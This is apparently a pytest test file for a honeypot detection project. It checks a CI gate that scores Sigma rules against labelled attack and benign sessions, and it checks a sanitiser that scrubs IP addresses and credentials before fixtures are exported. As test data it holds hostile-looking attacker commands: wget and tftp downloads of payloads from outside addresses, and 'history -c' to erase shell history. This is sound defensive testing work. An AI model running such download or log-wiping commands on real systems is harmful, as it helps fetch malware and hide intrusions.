"""Fixtures: the CI gate, the thresholds, and the sanitising export."""

from __future__ import annotations

import ipaddress
import json
import re
from datetime import timedelta
from pathlib import Path

import pytest

from conftest import BASE_TIME, RULES_DIR
from deception_shield.evaluation import parse_window
from deception_shield.fixtures import (
    Fixture,
    Sanitiser,
    Thresholds,
    load_fixtures,
    load_thresholds,
    run_gate,
    select_fixtures,
    write_fixtures,
)
from deception_shield.labels import Label
from deception_shield.sigma import load_rules

DETECTIONS = RULES_DIR.parent


def fixture(
    session_factory, ident: str, commands: tuple[str, ...], label: str, *techniques: str
) -> Fixture:
    return Fixture(session_factory(ident, commands), label, techniques, "test")


@pytest.fixture
def passing(session_factory) -> list[Fixture]:
    return [
        fixture(session_factory, "a/1", ("wget http://203.0.113.4/x",), "attack", "T1105"),
        fixture(session_factory, "a/2", ("history -c",), "attack", "T1070.003"),
        fixture(session_factory, "b/1", ("ls -la",), "benign"),
        fixture(session_factory, "b/2", ("df -h",), "benign"),
    ]


class TestGate:
    def test_a_clean_run_passes(self, passing, small_rules: Path) -> None:
        result = run_gate(passing, load_rules(small_rules), Thresholds())
        assert result.passed, [c for c in result.checks if not c.passed]
        assert (result.attack, result.benign) == (2, 2)

    def test_missed_attacks_fail_the_build(
        self, passing, session_factory, small_rules: Path
    ) -> None:
        passing.append(fixture(session_factory, "a/3", ("nproc",), "attack"))
        result = run_gate(passing, load_rules(small_rules), Thresholds(attack_recall=0.95))
        failed = {c.name for c in result.checks if not c.passed}
        assert failed == {"attack detection"}
        assert [f.session.id for f in result.missed] == ["a/3"]

    def test_a_technique_its_rules_miss_fails_the_build(
        self, passing, session_factory, small_rules: Path
    ) -> None:
        # Detected, but only by the history rule, not by the T1105 rule it is labelled with.
        passing.append(fixture(session_factory, "a/3", ("history -c",), "attack", "T1105"))
        result = run_gate(passing, load_rules(small_rules), Thresholds(technique_recall=0.9))
        assert {c.name for c in result.checks if not c.passed} == {"T1105 detection"}

    def test_a_technique_override_records_a_known_gap(
        self, passing, session_factory, small_rules: Path
    ) -> None:
        passing.append(fixture(session_factory, "a/3", ("history -c",), "attack", "T1105"))
        thresholds = Thresholds(technique_recall_overrides={"T1105": 0.5})
        assert run_gate(passing, load_rules(small_rules), thresholds).passed

    def test_benign_alerts_fail_the_build(
        self, passing, session_factory, small_rules: Path
    ) -> None:
        passing.append(fixture(session_factory, "b/3", ("wget https://example.com/f",), "benign"))
        result = run_gate(passing, load_rules(small_rules), Thresholds(false_positive_rate=0.5))
        assert {c.name for c in result.checks if not c.passed} == {"wget: false positives"}
        assert result.false_positives[0][0].session.id == "b/3"

    def test_a_rule_may_be_allowed_known_false_positives(
        self, passing, session_factory, small_rules: Path
    ) -> None:
        passing.append(fixture(session_factory, "b/3", ("wget https://example.com/f",), "benign"))
        thresholds = Thresholds(
            false_positive_rate=0.5,
            rule_false_positive_overrides={"11111111-1111-4111-8111-111111111111": 1},
        )
        assert run_gate(passing, load_rules(small_rules), thresholds).passed

    def test_an_untested_rule_fails_the_build(self, passing, small_rules: Path) -> None:
        result = run_gate(passing[1:], load_rules(small_rules), Thresholds())
        failed = {c.name for c in result.checks if not c.passed}
        assert {"wget: coverage", "T1105 detection"} <= failed

    def test_both_fixture_sets_are_required(self, passing, small_rules: Path) -> None:
        result = run_gate(passing[:2], load_rules(small_rules), Thresholds())
        assert "fixtures present" in {c.name for c in result.checks if not c.passed}


class TestThresholds:
    def test_defaults_when_unset(self, tmp_path: Path) -> None:
        path = tmp_path / "t.yml"
        path.write_text("attack_recall: 0.8\n", encoding="utf-8")
        thresholds = load_thresholds(path)
        assert thresholds.attack_recall == 0.8 and thresholds.rule_false_positives == 0

    def test_overrides(self, tmp_path: Path) -> None:
        path = tmp_path / "t.yml"
        path.write_text("overrides:\n  technique_recall:\n    T1105: 0.5\n", encoding="utf-8")
        thresholds = load_thresholds(path)
        assert (
            thresholds.technique_minimum("T1105") == 0.5
            and thresholds.technique_minimum("T1082") == 0.9
        )

    def test_a_misspelt_setting_is_an_error(self, tmp_path: Path) -> None:
        path = tmp_path / "t.yml"
        path.write_text("atack_recall: 0.8\n", encoding="utf-8")
        with pytest.raises(ValueError, match="unknown setting"):
            load_thresholds(path)


class TestSanitiser:
    def test_public_addresses_move_into_documentation_ranges(self) -> None:
        sanitiser = Sanitiser()
        replaced = sanitiser.address("45.95.147.236")
        assert replaced != "45.95.147.236"
        assert ipaddress.ip_address(replaced) in ipaddress.ip_network("192.0.2.0/24") or any(
            ipaddress.ip_address(replaced) in ipaddress.ip_network(n)
            for n in ("198.51.100.0/24", "203.0.113.0/24")
        )

    def test_the_same_address_always_becomes_the_same_stand_in(self) -> None:
        sanitiser = Sanitiser()
        text = sanitiser.text("wget http://45.95.147.236/a; tftp 45.95.147.236 -c get b")
        stand_in = sanitiser.address("45.95.147.236")
        assert text == f"wget http://{stand_in}/a; tftp {stand_in} -c get b"

    def test_local_addresses_are_kept(self) -> None:
        sanitiser = Sanitiser()
        for address in ("10.0.0.5", "192.168.1.20", "127.0.0.1", "169.254.169.254", "203.0.113.7"):
            assert sanitiser.address(address) == address

    def test_a_session_is_scrubbed(self, session_factory) -> None:
        session = session_factory(
            "devbox/alice/20260920T120000Z", ("ssh alice@45.95.147.236",), username="alice"
        )
        session.password = "hunter2"
        session.sensor = "devbox"
        clean = Sanitiser({"alice": "operator", "devbox": "host-a"}).session(session)
        assert clean.id == "host-a/operator/20260920T120000Z"
        assert clean.username == "operator" and clean.sensor == "host-a" and clean.password is None
        assert (
            "alice" not in clean.commands[0].text and "45.95.147.236" not in clean.commands[0].text
        )


class TestExport:
    @pytest.fixture
    def labelled(self, session_factory):
        dev, held = BASE_TIME, BASE_TIME + timedelta(days=8)
        sessions = [
            session_factory("hp/1", ("wget http://45.95.147.236/x",), start=dev),
            session_factory(
                "hp/2", ("wget http://45.95.147.237/x",), start=dev + timedelta(hours=1)
            ),
            session_factory("hp/3", ("history -c",), start=dev),
            session_factory("hp/4", ("uname -a",), start=held),
            session_factory("hp/5", ("exit",), start=dev),
            session_factory("host/1", ("ls",), start=dev, origin="shell-history"),
        ]
        labels = {
            "hp/1": Label("hp/1", "attack", ("T1105",)),
            "hp/2": Label("hp/2", "attack", ("T1105",)),
            "hp/3": Label("hp/3", "attack", ("T1070.003",)),
            "hp/4": Label("hp/4", "attack", ("T1082",)),
            "hp/5": Label("hp/5", "exclude"),
            "host/1": Label("host/1", "benign", ("T1105",)),
        }
        return sessions, labels

    def test_one_fixture_per_family_from_the_tuning_weeks_only(self, labelled) -> None:
        sessions, labels = labelled
        window = parse_window("2026-W40")
        chosen = select_fixtures(sessions, labels, exclude=window, provenance="captured:test")
        ids = {f.session.id for f in chosen}
        assert ids == {
            "hp/1",
            "hp/3",
            "host/1",
        }  # hp/2 shares hp/1's family; hp/4 is held out; hp/5 excluded
        assert all(f.provenance == "captured:test" for f in chosen)

    def test_benign_fixtures_carry_no_techniques(self, labelled) -> None:
        sessions, labels = labelled
        [benign] = [f for f in select_fixtures(sessions, labels) if f.label == "benign"]
        assert benign.techniques == ()

    def test_exported_fixtures_are_sanitised(self, labelled) -> None:
        sessions, labels = labelled
        texts = [c.text for f in select_fixtures(sessions, labels) for c in f.session.commands]
        assert not any("45.95.147" in text for text in texts)

    def test_write_merges_by_identifier(self, tmp_path: Path, labelled) -> None:
        sessions, labels = labelled
        chosen = select_fixtures(sessions, labels, per_family=2)
        path = tmp_path / "attack" / "captured.jsonl"
        assert write_fixtures(path, chosen) == (len(chosen), len(chosen))
        assert write_fixtures(path, chosen[:1]) == (len(chosen), 0)
        assert len(load_fixtures(tmp_path)) == len(chosen)


class TestLoading:
    def test_labels_must_be_attack_or_benign(self, tmp_path: Path, session_factory) -> None:
        record = session_factory("a/1").to_dict() | {"label": "exclude"}
        (tmp_path / "f.jsonl").write_text(json.dumps(record) + "\n", encoding="utf-8")
        with pytest.raises(ValueError, match="attack or benign"):
            load_fixtures(tmp_path)

    def test_an_identifier_may_appear_once(self, tmp_path: Path, session_factory) -> None:
        record = json.dumps(session_factory("a/1").to_dict() | {"label": "attack"})
        (tmp_path / "one.jsonl").write_text(record + "\n", encoding="utf-8")
        (tmp_path / "two.jsonl").write_text(record + "\n", encoding="utf-8")
        with pytest.raises(ValueError, match="also appears"):
            load_fixtures(tmp_path)


@pytest.fixture(scope="module")
def committed() -> list[Fixture]:
    return load_fixtures(DETECTIONS / "fixtures")


class TestCommittedFixtures:
    """What CI runs on every commit."""

    def test_the_committed_rules_pass_the_committed_gate(self, committed) -> None:
        result = run_gate(
            committed, load_rules(RULES_DIR), load_thresholds(DETECTIONS / "thresholds.yml")
        )
        assert result.passed, [c for c in result.checks if not c.passed]

    def test_no_committed_fixture_carries_a_routable_address_or_a_password(self, committed) -> None:
        """The repository is public; attack addresses belong to victims as often as to attackers."""
        pattern = re.compile(r"(?<![\d.])(?:\d{1,3}\.){3}\d{1,3}(?!\d)")
        for item in committed:
            assert item.session.password is None, item.session.id
            text = json.dumps(item.to_dict())
            for candidate in pattern.findall(text):
                try:
                    address = ipaddress.IPv4Address(candidate)
                except ValueError:
                    continue
                assert not address.is_global, f"{item.session.id} carries {candidate}"

    def test_every_fixture_says_where_it_came_from(self, committed) -> None:
        assert all(item.provenance for item in committed)
